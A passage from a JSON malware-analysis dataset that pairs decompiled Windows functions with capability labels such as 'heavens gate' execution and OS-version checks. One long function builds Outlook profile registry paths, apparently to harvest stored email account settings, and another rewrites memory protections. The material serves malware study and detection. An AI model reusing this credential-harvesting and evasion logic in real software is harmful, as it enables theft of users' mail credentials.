        "decompiled_code": "\nvoid fcn.0043b534(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.004356d7(0);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "00404b60": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint fcn.00404b60(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    int32_t unaff_EDI;\n    uint lpflOldProtect;\n    \n    uVar2 = 0;\n    if (*(unaff_EDI + 0x46) != 0) {\n        puVar3 = *(unaff_EDI + 0x138) + 0x24;\n        do {\n            if ((*puVar3 & 0x20) != 0) {\n                *puVar3 = *puVar3 | 0x60000000;\n            }\n    // switch table (7 cases) at 0x404c00\n            switch(*puVar3 >> 0x1d) {\n            case 0:\n            case 2:\n                lpflOldProtect = 2;\n                break;\n            case 1:\n                lpflOldProtect = 0x10;\n                break;\n            case 3:\n                lpflOldProtect = 0x20;\n                break;\n            case 4:\n            case 6:\n                lpflOldProtect = 4;\n                break;\n            default:\n                lpflOldProtect = 0x40;\n            }\n            iVar1 = (*_sym.imp.KERNEL32.dll_VirtualProtect)\n                              (puVar3[-6] + *(unaff_EDI + 0x144), puVar3[-7], lpflOldProtect, &lpflOldProtect);\n            if (iVar1 == 0) {\n                return 9;\n            }\n            uVar2 = uVar2 + 1;\n            puVar3 = puVar3 + 10;\n        } while (uVar2 < *(unaff_EDI + 0x46));\n    }\n    return 0;\n}\n",
        "token_count": 390
    },
    "0040a500": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nvoid fcn.0040a500(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    \n    if (in_EAX != NULL) {\n        *in_EAX = unaff_ESI[0xf];\n    }\n    if ((*unaff_ESI == 4) || (*unaff_ESI == 5)) {\n        (**(unaff_EDI + 0x24))(*(unaff_EDI + 0x28), unaff_ESI[3]);\n    }\n    if (*unaff_ESI == 6) {\n        (**(unaff_EDI + 0x24))(*(unaff_EDI + 0x28), unaff_ESI[1]);\n    }\n    unaff_ESI[0xd] = unaff_ESI[10];\n    unaff_ESI[0xc] = unaff_ESI[10];\n    *unaff_ESI = 0;\n    unaff_ESI[7] = 0;\n    unaff_ESI[8] = 0;\n    if (unaff_ESI[0xe] != NULL) {\n        iVar1 = (*unaff_ESI[0xe])(0, 0, 0);\n        unaff_ESI[0xf] = iVar1;\n        *(unaff_EDI + 0x30) = iVar1;\n    }\n    return;\n}\n",
        "token_count": 313
    },
    "0040afc0": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint fcn.0040afc0(void)\n\n{\n    int32_t iVar1;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    \n    if ((*unaff_ESI == 4) || (*unaff_ESI == 5)) {\n        (**(unaff_EDI + 0x24))(*(unaff_EDI + 0x28), unaff_ESI[3]);\n    }\n    if (*unaff_ESI == 6) {\n        (**(unaff_EDI + 0x24))(*(unaff_EDI + 0x28), unaff_ESI[1]);\n    }\n    unaff_ESI[0xd] = unaff_ESI[10];\n    unaff_ESI[0xc] = unaff_ESI[10];\n    *unaff_ESI = 0;\n    unaff_ESI[7] = 0;\n    unaff_ESI[8] = 0;\n    if (unaff_ESI[0xe] != NULL) {\n        iVar1 = (*unaff_ESI[0xe])(0, 0, 0);\n        unaff_ESI[0xf] = iVar1;\n        *(unaff_EDI + 0x30) = iVar1;\n    }\n    (**(unaff_EDI + 0x24))(*(unaff_EDI + 0x28), unaff_ESI[10]);\n    (**(unaff_EDI + 0x24))(*(unaff_EDI + 0x28), unaff_ESI[9]);\n    (**(unaff_EDI + 0x24))(*(unaff_EDI + 0x28));\n    return 0;\n}\n",
        "token_count": 366
    },
    "00405520": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00405520(void)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    int32_t *in_FS_OFFSET;\n    char *arg_8h;\n    uint var_340h;\n    uint var_33ch;\n    uint var_338h;\n    uint var_334h;\n    uint var_330h;\n    uchar auStack788 [140];\n    uchar auStack648 [28];\n    uchar auStack620 [28];\n    uchar auStack592 [28];\n    uint32_t var_230h;\n    uint var_220h;\n    uint32_t var_21ch;\n    uint32_t var_214h;\n    uint var_204h;\n    uint32_t var_200h;\n    uint32_t var_1f8h;\n    uint var_1e8h;\n    uint32_t var_1e4h;\n    uint32_t var_1dch;\n    uint var_1cch;\n    uint32_t var_1c8h;\n    uint32_t var_1c0h;\n    uint var_1b0h;\n    uint32_t var_1ach;\n    uint32_t var_1a4h;\n    uint var_194h;\n    uint32_t var_190h;\n    uint32_t var_188h;\n    uint var_178h;\n    uint32_t var_174h;\n    uint32_t var_16ch;\n    uint var_15ch;\n    uint32_t var_158h;\n    uint32_t var_150h;\n    uint var_140h;\n    uint32_t var_13ch;\n    uint32_t var_134h;\n    uint var_124h;\n    uint32_t var_120h;\n    uchar auStack284 [264];\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4435b8;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar1 = (**0x45757c)(0, 9999999, var_10h);\n    *0x4572d4 = (**0x457504)(uVar1);\n    var_190h = 0xf;\n    var_194h = 0;\n    var_1a4h = var_1a4h & 0xffffff00;\n    fcn.004090e0(\"B88A00104B2A6676\\\\00000001\", 0x19);\n    var_4h = 0;\n    var_120h = 0xf;\n    var_124h = 0;\n    var_134h = var_134h & 0xffffff00;\n    fcn.004090e0(\"look\\\\9375CFF0413111d3\", 0x15);\n    var_4h._0_1_ = 1;\n    var_13ch = 0xf;\n    var_140h = 0;\n    var_150h = var_150h & 0xffffff00;\n    fcn.004090e0(\"aging Subsystem\\\\Profiles\\\\Out\", 0x1c);\n    var_4h._0_1_ = 2;\n    var_158h = 0xf;\n    var_15ch = 0;\n    var_16ch = var_16ch & 0xffffff00;\n    fcn.004090e0(\"NT\\\\CurrentVersion\\\\Windows Mess\", 0x1e);\n    var_4h._0_1_ = 3;\n    var_174h = 0xf;\n    var_178h = 0;\n    var_188h = var_188h & 0xffffff00;\n    fcn.004090e0(\"osoft\\\\Windows \", 0xe);\n    var_4h._0_1_ = 4;\n    fcn.00409750(&var_188h);\n    var_4h._0_1_ = 5;\n    fcn.004097a0(&var_230h);\n    var_4h._0_1_ = 6;\n    fcn.004097a0(&var_1c0h);\n    var_4h._0_1_ = 7;\n    fcn.004097a0(&var_1f8h);\n    var_4h._0_1_ = 8;\n    puVar2 = fcn.004097a0(&var_1dch);\n    var_4h = CONCAT31(var_4h._1_3_, 9);\n    if (0xf < puVar2[5]) {\n        puVar2 = *puVar2;\n    }\n    fcn.004053b0(puVar2);\n    if (0xf < var_1c8h) {\n        fcn.0042d62b(var_1dch);\n    }\n    var_1c8h = 0xf;\n    var_1cch = 0;\n    var_1dch = var_1dch & 0xffffff00;\n    if (0xf < var_1e4h) {\n        fcn.0042d62b(var_1f8h);\n    }\n    var_1e4h = 0xf;\n    var_1e8h = 0;\n    var_1f8h = var_1f8h & 0xffffff00;\n    if (0xf < var_1ach) {\n        fcn.0042d62b(var_1c0h);\n    }\n    var_1ach = 0xf;\n    var_1b0h = 0;\n    var_1c0h = var_1c0h & 0xffffff00;\n    if (0xf < var_21ch) {\n        fcn.0042d62b(var_230h);\n    }\n    var_21ch = 0xf;\n    var_220h = 0;\n    var_230h = var_230h & 0xffffff00;\n    if (0xf < var_200h) {\n        fcn.0042d62b(var_214h);\n    }\n    var_200h = 0xf;\n    var_204h = 0;\n    var_214h = var_214h & 0xffffff00;\n    if (0xf < var_174h) {\n        fcn.0042d62b(var_188h);\n    }\n    var_174h = 0xf;\n    var_178h = 0;\n    var_188h = var_188h & 0xffffff00;\n    if (0xf < var_158h) {\n        fcn.0042d62b(var_16ch);\n    }\n    var_158h = 0xf;\n    var_15ch = 0;\n    var_16ch = var_16ch & 0xffffff00;\n    if (0xf < var_13ch) {\n        fcn.0042d62b(var_150h);\n    }\n    var_13ch = 0xf;\n    var_140h = 0;\n    var_150h = var_150h & 0xffffff00;\n    if (0xf < var_120h) {\n        fcn.0042d62b(var_134h);\n    }\n    var_4h = 0xffffffff;\n    var_120h = 0xf;\n    var_124h = 0;\n    var_134h = var_134h & 0xffffff00;\n    if (0xf < var_190h) {\n        fcn.0042d62b(var_1a4h);\n    }\n    var_190h = 0xf;\n    var_194h = 0;\n    var_1a4h = var_1a4h & 0xffffff00;\n    fcn.004090e0(\"B88A00104B2A6676\\\\00000002\", 0x19);\n    var_4h = 10;\n    var_174h = 0xf;\n    var_178h = 0;\n    var_188h = var_188h & 0xffffff00;\n    fcn.004090e0(\"look\\\\9375CFF0413111d3\", 0x15);\n    var_4h._0_1_ = 0xb;\n    var_158h = 0xf;\n    var_15ch = 0;\n    var_16ch = var_16ch & 0xffffff00;\n    fcn.004090e0(\"aging Subsystem\\\\Profiles\\\\Out\", 0x1c);\n    var_4h._0_1_ = 0xc;\n    var_13ch = 0xf;\n    var_140h = 0;\n    var_150h = var_150h & 0xffffff00;\n    fcn.004090e0(\"NT\\\\CurrentVersion\\\\Windows Mess\", 0x1e);\n    var_4h._0_1_ = 0xd;\n    var_120h = 0xf;\n    var_124h = 0;\n    var_134h = var_134h & 0xffffff00;\n    fcn.004090e0(\"osoft\\\\Windows \", 0xe);\n    var_4h._0_1_ = 0xe;\n    fcn.00409750(&var_134h);\n    var_4h._0_1_ = 0xf;\n    fcn.004097a0(&var_1f8h);\n    var_4h._0_1_ = 0x10;\n    fcn.004097a0(&var_1c0h);\n    var_4h._0_1_ = 0x11;\n    fcn.004097a0(&var_230h);\n    var_4h._0_1_ = 0x12;\n    puVar2 = fcn.004097a0(&var_214h);\n    var_4h = CONCAT31(var_4h._1_3_, 0x13);\n    if (0xf < puVar2[5]) {\n        puVar2 = *puVar2;\n    }\n    fcn.004053b0(puVar2);\n    if (0xf < var_200h) {\n        fcn.0042d62b(var_214h);\n    }\n    var_200h = 0xf;\n    var_204h = 0;\n    var_214h = var_214h & 0xffffff00;\n    if (0xf < var_21ch) {\n        fcn.0042d62b(var_230h);\n    }\n    var_21ch = 0xf;\n    var_220h = 0;\n    var_230h = var_230h & 0xffffff00;\n    if (0xf < var_1ach) {\n        fcn.0042d62b(var_1c0h);\n    }\n    var_1ach = 0xf;\n    var_1b0h = 0;\n    var_1c0h = var_1c0h & 0xffffff00;\n    if (0xf < var_1e4h) {\n        fcn.0042d62b(var_1f8h);\n    }\n    var_1e4h = 0xf;\n    var_1e8h = 0;\n    var_1f8h = var_1f8h & 0xffffff00;\n    if (0xf < var_1c8h) {\n        fcn.0042d62b(var_1dch);\n    }\n    var_1c8h = 0xf;\n    var_1cch = 0;\n    var_1dch = var_1dch & 0xffffff00;\n    if (0xf < var_120h) {\n        fcn.0042d62b(var_134h);\n    }\n    var_120h = 0xf;\n    var_124h = 0;\n    var_134h = var_134h & 0xffffff00;\n    if (0xf < var_13ch) {\n        fcn.0042d62b(var_150h);\n    }\n    var_13ch = 0xf;\n    var_140h = 0;\n    var_150h = var_150h & 0xffffff00;\n    if (0xf < var_158h) {\n        fcn.0042d62b(var_16ch);\n    }\n    var_158h = 0xf;\n    var_15ch = 0;\n    var_16ch = var_16ch & 0xffffff00;\n    if (0xf < var_174h) {\n        fcn.0042d62b(var_188h);\n    }\n    var_4h = 0xffffffff;\n    var_174h = 0xf;\n    var_178h = 0;\n    var_188h = var_188h & 0xffffff00;\n    if (0xf < var_190h) {\n        fcn.0042d62b(var_1a4h);\n    }\n    var_190h = 0xf;\n    var_194h = 0;\n    var_1a4h = var_1a4h & 0xffffff00;\n    fcn.004090e0(\"B88A00104B2A6676\\\\00000003\", 0x19);\n    var_4h = 0x14;\n    var_174h = 0xf;\n    var_178h = 0;\n    var_188h = var_188h & 0xffffff00;\n    fcn.004090e0(\"look\\\\9375CFF0413111d3\", 0x15);\n    var_4h._0_1_ = 0x15;\n    var_158h = 0xf;\n    var_15ch = 0;\n    var_16ch = var_16ch & 0xffffff00;\n    fcn.004090e0(\"aging Subsystem\\\\Profiles\\\\Out\", 0x1c);\n    var_4h._0_1_ = 0x16;\n    var_13ch = 0xf;\n    var_140h = 0;\n    var_150h = var_150h & 0xffffff00;\n    fcn.004090e0(\"NT\\\\CurrentVersion\\\\Windows Mess\", 0x1e);\n    var_4h._0_1_ = 0x17;\n    var_120h = 0xf;\n    var_124h = 0;\n    var_134h = var_134h & 0xffffff00;\n    fcn.004090e0(\"osoft\\\\Windows \", 0xe);\n    var_4h._0_1_ = 0x18;\n    fcn.00409750(&var_134h);\n    var_4h._0_1_ = 0x19;\n    fcn.004097a0(&var_1f8h);\n    var_4h._0_1_ = 0x1a;\n    fcn.004097a0(&var_1c0h);\n    var_4h._0_1_ = 0x1b;\n    fcn.004097a0(&var_230h);\n    var_4h._0_1_ = 0x1c;\n    puVar2 = fcn.004097a0(&var_214h);\n    var_4h = CONCAT31(var_4h._1_3_, 0x1d);\n    if (0xf < puVar2[5]) {\n        puVar2 = *puVar2;\n    }\n    fcn.004053b0(puVar2);\n    if (0xf < var_200h) {\n        fcn.0042d62b(var_214h);\n    }\n    var_200h = 0xf;\n    var_204h = 0;\n    var_214h = var_214h & 0xffffff00;\n    if (0xf < var_21ch) {\n        fcn.0042d62b(var_230h);\n    }\n    var_21ch = 0xf;\n    var_220h = 0;\n    var_230h = var_230h & 0xffffff00;\n    if (0xf < var_1ach) {\n        fcn.0042d62b(var_1c0h);\n    }\n    var_1ach = 0xf;\n    var_1b0h = 0;\n    var_1c0h = var_1c0h & 0xffffff00;\n    if (0xf < var_1e4h) {\n        fcn.0042d62b(var_1f8h);\n    }\n    var_1e4h = 0xf;\n    var_1e8h = 0;\n    var_1f8h = var_1f8h & 0xffffff00;\n    if (0xf < var_1c8h) {\n        fcn.0042d62b(var_1dch);\n    }\n    var_1c8h = 0xf;\n    var_1cch = 0;\n    var_1dch = var_1dch & 0xffffff00;\n    if (0xf < var_120h) {\n        fcn.0042d62b(var_134h);\n    }\n    var_120h = 0xf;\n    var_124h = 0;\n    var_134h = var_134h & 0xffffff00;\n    if (0xf < var_13ch) {\n        fcn.0042d62b(var_150h);\n    }\n    var_13ch = 0xf;\n    var_140h = 0;\n    var_150h = var_150h & 0xffffff00;\n    if (0xf < var_158h) {\n        fcn.0042d62b(var_16ch);\n    }\n    var_158h = 0xf;\n    var_15ch = 0;\n    var_16ch = var_16ch & 0xffffff00;\n    if (0xf < var_174h) {\n        fcn.0042d62b(var_188h);\n    }\n    var_4h = 0xffffffff;\n    var_174h = 0xf;\n    var_178h = 0;\n    var_188h = var_188h & 0xffffff00;\n    if (0xf < var_190h) {\n        fcn.0042d62b(var_1a4h);\n    }\n    var_190h = 0xf;\n    var_194h = 0;\n    var_1a4h = var_1a4h & 0xffffff00;\n    fcn.004090e0(\"B88A00104B2A6676\\\\00000004\", 0x19);\n    var_4h = 0x1e;\n    var_174h = 0xf;\n    var_178h = 0;\n    var_188h = var_188h & 0xffffff00;\n    fcn.004090e0(\"look\\\\9375CFF0413111d3\", 0x15);\n    var_4h._0_1_ = 0x1f;\n    var_158h = 0xf;\n    var_15ch = 0;\n    var_16ch = var_16ch & 0xffffff00;\n    fcn.004090e0(\"aging Subsystem\\\\Profiles\\\\Out\", 0x1c);\n    var_4h._0_1_ = 0x20;\n    var_13ch = 0xf;\n    var_140h = 0;\n    var_150h = var_150h & 0xffffff00;\n    fcn.004090e0(\"NT\\\\CurrentVersion\\\\Windows Mess\", 0x1e);\n    var_4h._0_1_ = 0x21;\n    var_120h = 0xf;\n    var_124h = 0;\n    var_134h = var_134h & 0xffffff00;\n    fcn.004090e0(\"osoft\\\\Windows \", 0xe);\n    var_4h._0_1_ = 0x22;\n    fcn.00409750(&var_134h);\n    var_4h._0_1_ = 0x23;\n    fcn.004097a0(&var_1f8h);\n    var_4h._0_1_ = 0x24;\n    fcn.004097a0(&var_1c0h);\n    var_4h._0_1_ = 0x25;\n    fcn.004097a0(&var_230h);\n    var_4h._0_1_ = 0x26;\n    puVar2 = fcn.004097a0(&var_214h);\n    var_4h = CONCAT31(var_4h._1_3_, 0x27);\n    if (0xf < puVar2[5]) {\n        puVar2 = *puVar2;\n    }\n    fcn.004053b0(puVar2);\n    if (0xf < var_200h) {\n        fcn.0042d62b(var_214h);\n    }\n    var_200h = 0xf;\n    var_204h = 0;\n    var_214h = var_214h & 0xffffff00;\n    if (0xf < var_21ch) {\n        fcn.0042d62b(var_230h);\n    }\n    var_21ch = 0xf;\n    var_220h = 0;\n    var_230h = var_230h & 0xffffff00;\n    if (0xf < var_1ach) {\n        fcn.0042d62b(var_1c0h);\n    }\n    var_1ach = 0xf;\n    var_1b0h = 0;\n    var_1c0h = var_1c0h & 0xffffff00;\n    if (0xf < var_1e4h) {\n        fcn.0042d62b(var_1f8h);\n    }\n    var_1e4h = 0xf;\n    var_1e8h = 0;\n    var_1f8h = var_1f8h & 0xffffff00;\n    if (0xf < var_1c8h) {\n        fcn.0042d62b(var_1dch);\n    }\n    var_1c8h = 0xf;\n    var_1cch = 0;\n    var_1dch = var_1dch & 0xffffff00;\n    if (0xf < var_120h) {\n        fcn.0042d62b(var_134h);\n    }\n    var_120h = 0xf;\n    var_124h = 0;\n    var_134h = var_134h & 0xffffff00;\n    if (0xf < var_13ch) {\n        fcn.0042d62b(var_150h);\n    }\n    var_13ch = 0xf;\n    var_140h = 0;\n    var_150h = var_150h & 0xffffff00;\n    if (0xf < var_158h) {\n        fcn.0042d62b(var_16ch);\n    }\n    var_158h = 0xf;\n    var_15ch = 0;\n    var_16ch = var_16ch & 0xffffff00;\n    if (0xf < var_174h) {\n        fcn.0042d62b(var_188h);\n    }\n    var_4h = 0xffffffff;\n    var_174h = 0xf;\n    var_178h = 0;\n    var_188h = var_188h & 0xffffff00;\n    if (0xf < var_190h) {\n        fcn.0042d62b(var_1a4h);\n    }\n    var_190h = 0xf;\n    var_194h = 0;\n    var_1a4h = var_1a4h & 0xffffff00;\n    fcn.004090e0(\"B88A00104B2A6676\\\\00000001\", 0x19);\n    var_4h = 0x28;\n    var_174h = 0xf;\n    var_178h = 0;\n    var_188h = var_188h & 0xffffff00;\n    fcn.004090e0(\"look\\\\9375CFF0413111d3\", 0x15);\n    var_4h._0_1_ = 0x29;\n    var_158h = 0xf;\n    var_15ch = 0;\n    var_16ch = var_16ch & 0xffffff00;\n    fcn.004090e0(\"ook\\\\Profiles\\\\Out\", 0x10);\n    var_4h._0_1_ = 0x2a;\n    var_13ch = 0xf;\n    var_140h = 0;\n    var_150h = var_150h & 0xffffff00;\n    fcn.004090e0(\"ce\\\\13.0\\\\Outl\", 0xc);\n    var_4h._0_1_ = 0x2b;\n    var_120h = 0xf;\n    var_124h = 0;\n    var_134h = var_134h & 0xffffff00;\n    fcn.004090e0(\"osoft\\\\Offi\", 10);\n    var_4h._0_1_ = 0x2c;\n    fcn.00409750(&var_134h);\n    var_4h._0_1_ = 0x2d;\n    fcn.004097a0(&var_1f8h);\n    var_4h._0_1_ = 0x2e;\n    fcn.004097a0(&var_1c0h);\n    var_4h._0_1_ = 0x2f;\n    fcn.004097a0(&var_230h);\n    var_4h._0_1_ = 0x30;\n    puVar2 = fcn.004097a0(&var_214h);\n    var_4h = CONCAT31(var_4h._1_3_, 0x31);\n    if (0xf < puVar2[5]) {\n        puVar2 = *puVar2;\n    }\n    fcn.004053b0(puVar2);\n    if (0xf < var_200h) {\n        fcn.0042d62b(var_214h);\n    }\n    var_200h = 0xf;\n    var_204h = 0;\n    var_214h = var_214h & 0xffffff00;\n    if (0xf < var_21ch) {\n        fcn.0042d62b(var_230h);\n    }\n    var_21ch = 0xf;\n    var_220h = 0;\n    var_230h = var_230h & 0xffffff00;\n    if (0xf < var_1ach) {\n        fcn.0042d62b(var_1c0h);\n    }\n    var_1ach = 0xf;\n    var_1b0h = 0;\n    var_1c0h = var_1c0h & 0xffffff00;\n    if (0xf < var_1e4h) {\n        fcn.0042d62b(var_1f8h);\n    }\n    var_1e4h = 0xf;\n    var_1e8h = 0;\n    var_1f8h = var_1f8h & 0xffffff00;\n    if (0xf < var_1c8h) {\n        fcn.0042d62b(var_1dch);\n    }\n    var_1c8h = 0xf;\n    var_1cch = 0;\n    var_1dch = var_1dch & 0xffffff00;\n    if (0xf < var_120h) {\n        fcn.0042d62b(var_134h);\n    }\n    var_120h = 0xf;\n    var_124h = 0;\n    var_134h = var_134h & 0xffffff00;\n    if (0xf < var_13ch) {\n        fcn.0042d62b(var_150h);\n    }\n    var_13ch = 0xf;\n    var_140h = 0;\n    var_150h = var_150h & 0xffffff00;\n    if (0xf < var_158h) {\n        fcn.0042d62b(var_16ch);\n    }\n    var_158h = 0xf;\n    var_15ch = 0;\n    var_16ch = var_16ch & 0xffffff00;\n    if (0xf < var_174h) {\n        fcn.0042d62b(var_188h);\n    }\n    var_4h = 0xffffffff;\n    var_174h = 0xf;\n    var_178h = 0;\n    var_188h = var_188h & 0xffffff00;\n    if (0xf < var_190h) {\n        fcn.0042d62b(var_1a4h);\n    }\n    var_190h = 0xf;\n    var_194h = 0;\n    var_1a4h = var_1a4h & 0xffffff00;\n    fcn.004090e0(\"B88A00104B2A6676\\\\00000002\", 0x19);\n    var_4h = 0x32;\n    var_174h = 0xf;\n    var_178h = 0;\n    var_188h = var_188h & 0xffffff00;\n    fcn.004090e0(\"look\\\\9375CFF0413111d3\", 0x15);\n    var_4h._0_1_ = 0x33;\n    var_158h = 0xf;\n    var_15ch = 0;\n    var_16ch = var_16ch & 0xffffff00;\n    fcn.004090e0(\"ook\\\\Profiles\\\\Out\", 0x10);\n    var_4h._0_1_ = 0x34;\n    var_13ch = 0xf;\n    var_140h = 0;\n    var_150h = var_150h & 0xffffff00;\n    fcn.004090e0(\"ce\\\\13.0\\\\Outl\", 0xc);\n    var_4h._0_1_ = 0x35;\n    var_120h = 0xf;\n    var_124h = 0;\n    var_134h = var_134h & 0xffffff00;\n    fcn.004090e0(\"osoft\\\\Offi\", 10);\n    var_4h._0_1_ = 0x36;\n    fcn.00409750(&var_134h);\n    var_4h._0_1_ = 0x37;\n    fcn.004097a0(&var_1f8h);\n    var_4h._0_1_ = 0x38;\n    fcn.004097a0(&var_1c0h);\n    var_4h._0_1_ = 0x39;\n    fcn.004097a0(&var_230h);\n    var_4h._0_1_ = 0x3a;\n    puVar2 = fcn.004097a0(&var_214h);\n    var_4h = CONCAT31(var_4h._1_3_, 0x3b);\n    if (0xf < puVar2[5]) {\n        puVar2 = *puVar2;\n    }\n    fcn.004053b0(puVar2);\n    if (0xf < var_200h) {\n        fcn.0042d62b(var_214h);\n    }\n    var_200h = 0xf;\n    var_204h = 0;\n    var_214h = var_214h & 0xffffff00;\n    if (0xf < var_21ch) {\n        fcn.0042d62b(var_230h);\n    }\n    var_21ch = 0xf;\n    var_220h = 0;\n    var_230h = var_230h & 0xffffff00;\n    if (0xf < var_1ach) {\n        fcn.0042d62b(var_1c0h);\n    }\n    var_1ach = 0xf;\n    var_1b0h = 0;\n    var_1c0h = var_1c0h & 0xffffff00;\n    if (0xf < var_1e4h) {\n        fcn.0042d62b(var_1f8h);\n    }\n    var_1e4h = 0xf;\n    var_1e8h = 0;\n    var_1f8h = var_1f8h & 0xffffff00;\n    if (0xf < var_1c8h) {\n        fcn.0042d62b(var_1dch);\n    }\n    var_1c8h = 0xf;\n    var_1cch = 0;\n    var_1dch = var_1dch & 0xffffff00;\n    if (0xf < var_120h) {\n        fcn.0042d62b(var_134h);\n    }\n    var_120h = 0xf;\n    var_124h = 0;\n    var_134h = var_134h & 0xffffff00;\n    if (0xf < var_13ch) {\n        fcn.0042d62b(var_150h);\n    }\n    var_13ch = 0xf;\n    var_140h = 0;\n    var_150h = var_150h & 0xffffff00;\n    if (0xf < var_158h) {\n        fcn.0042d62b(var_16ch);\n    }\n    var_158h = 0xf;\n    var_15ch = 0;\n    var_16ch = var_16ch & 0xffffff00;\n    if (0xf < var_174h) {\n        fcn.0042d62b(var_188h);\n    }\n    var_4h = 0xffffffff;\n    var_174h = 0xf;\n    var_178h = 0;\n    var_188h = var_188h & 0xffffff00;\n    if (0xf < var_190h) {\n        fcn.0042d62b(var_1a4h);\n    }\n    var_190h = 0xf;\n    var_194h = 0;\n    var_1a4h = var_1a4h & 0xffffff00;\n    fcn.004090e0(\"B88A00104B2A6676\\\\00000003\", 0x19);\n    var_4h = 0x3c;\n    var_174h = 0xf;\n    var_178h = 0;\n    var_188h = var_188h & 0xffffff00;\n    fcn.004090e0(\"look\\\\9375CFF0413111d3\", 0x15);\n    var_4h._0_1_ = 0x3d;\n    var_158h = 0xf;\n    var_15ch = 0;\n    var_16ch = var_16ch & 0xffffff00;\n    fcn.004090e0(\"ook\\\\Profiles\\\\Out\", 0x10);\n    var_4h._0_1_ = 0x3e;\n    var_13ch = 0xf;\n    var_140h = 0;\n    var_150h = var_150h & 0xffffff00;\n    fcn.004090e0(\"ce\\\\13.0\\\\Outl\", 0xc);\n    var_4h._0_1_ = 0x3f;\n    var_120h = 0xf;\n    var_124h = 0;\n    var_134h = var_134h & 0xffffff00;\n    fcn.004090e0(\"osoft\\\\Offi\", 10);\n    var_4h._0_1_ = 0x40;\n    fcn.00409750(&var_134h);\n    var_4h._0_1_ = 0x41;\n    fcn.004097a0(&var_1f8h);\n    var_4h._0_1_ = 0x42;\n    fcn.004097a0(&var_1c0h);\n    var_4h._0_1_ = 0x43;\n    fcn.004097a0(&var_230h);\n    var_4h._0_1_ = 0x44;\n    puVar2 = fcn.004097a0(&var_214h);\n    var_4h = CONCAT31(var_4h._1_3_, 0x45);\n    if (0xf < puVar2[5]) {\n        puVar2 = *puVar2;\n    }\n    fcn.004053b0(puVar2);\n    if (0xf < var_200h) {\n        fcn.0042d62b(var_214h);\n    }\n    var_200h = 0xf;\n    var_204h = 0;\n    var_214h = var_214h & 0xffffff00;\n    if (0xf < var_21ch) {\n        fcn.0042d62b(var_230h);\n    }\n    var_21ch = 0xf;\n    var_220h = 0;\n    var_230h = var_230h & 0xffffff00;\n    if (0xf < var_1ach) {\n        fcn.0042d62b(var_1c0h);\n    }\n    var_1ach = 0xf;\n    var_1b0h = 0;\n    var_1c0h = var_1c0h & 0xffffff00;\n    if (0xf < var_1e4h) {\n        fcn.0042d62b(var_1f8h);\n    }\n    var_1e4h = 0xf;\n    var_1e8h = 0;\n    var_1f8h = var_1f8h & 0xffffff00;\n    if (0xf < var_1c8h) {\n        fcn.0042d62b(var_1dch);\n    }\n    var_1c8h = 0xf;\n    var_1cch = 0;\n    var_1dch = var_1dch & 0xffffff00;\n    if (0xf < var_120h) {\n        fcn.0042d62b(var_134h);\n    }\n    var_120h = 0xf;\n    var_124h = 0;\n    var_134h = var_134h & 0xffffff00;\n    if (0xf < var_13ch) {\n        fcn.0042d62b(var_150h);\n    }\n    var_13ch = 0xf;\n    var_140h = 0;\n    var_150h = var_150h & 0xffffff00;\n    if (0xf < var_158h) {\n        fcn.0042d62b(var_16ch);\n    }\n    var_158h = 0xf;\n    var_15ch = 0;\n    var_16ch = var_16ch & 0xffffff00;\n    if (0xf < var_174h) {\n        fcn.0042d62b(var_188h);\n    }\n    var_4h = 0xffffffff;\n    var_174h = 0xf;\n    var_178h = 0;\n    var_188h = var_188h & 0xffffff00;\n    if (0xf < var_190h) {\n        fcn.0042d62b(var_1a4h);\n    }\n    var_190h = 0xf;\n    var_194h = 0;\n    var_1a4h = var_1a4h & 0xffffff00;\n    fcn.004090e0(\"B88A00104B2A6676\\\\00000004\", 0x19);\n    var_4h = 0x46;\n    var_174h = 0xf;\n    var_178h = 0;\n    var_188h = var_188h & 0xffffff00;\n    fcn.004090e0(\"look\\\\9375CFF0413111d3\", 0x15);\n    var_4h._0_1_ = 0x47;\n    var_158h = 0xf;\n    var_15ch = 0;\n    var_16ch = var_16ch & 0xffffff00;\n    fcn.004090e0(\"ook\\\\Profiles\\\\Out\", 0x10);\n    var_4h._0_1_ = 0x48;\n    var_13ch = 0xf;\n    var_140h = 0;\n    var_150h = var_150h & 0xffffff00;\n    fcn.004090e0(\"ce\\\\13.0\\\\Outl\", 0xc);\n    var_4h._0_1_ = 0x49;\n    var_120h = 0xf;\n    var_124h = 0;\n    var_134h = var_134h & 0xffffff00;\n    fcn.004090e0(\"osoft\\\\Offi\", 10);\n    var_4h._0_1_ = 0x4a;\n    fcn.00409750(&var_134h);\n    var_4h._0_1_ = 0x4b;\n    fcn.004097a0(&var_1f8h);\n    var_4h._0_1_ = 0x4c;\n    fcn.004097a0(&var_1c0h);\n    var_4h._0_1_ = 0x4d;\n    fcn.004097a0(&var_230h);\n    var_4h._0_1_ = 0x4e;\n    puVar2 = fcn.004097a0(&var_214h);\n    var_4h = CONCAT31(var_4h._1_3_, 0x4f);\n    if (0xf < puVar2[5]) {\n        puVar2 = *puVar2;\n    }\n    fcn.004053b0(puVar2);\n    if (0xf < var_200h) {\n        fcn.0042d62b(var_214h);\n    }\n    var_200h = 0xf;\n    var_204h = 0;\n    var_214h = var_214h & 0xffffff00;\n    if (0xf < var_21ch) {\n        fcn.0042d62b(var_230h);\n    }\n    var_21ch = 0xf;\n    var_220h = 0;\n    var_230h = var_230h & 0xffffff00;\n    if (0xf < var_1ach) {\n        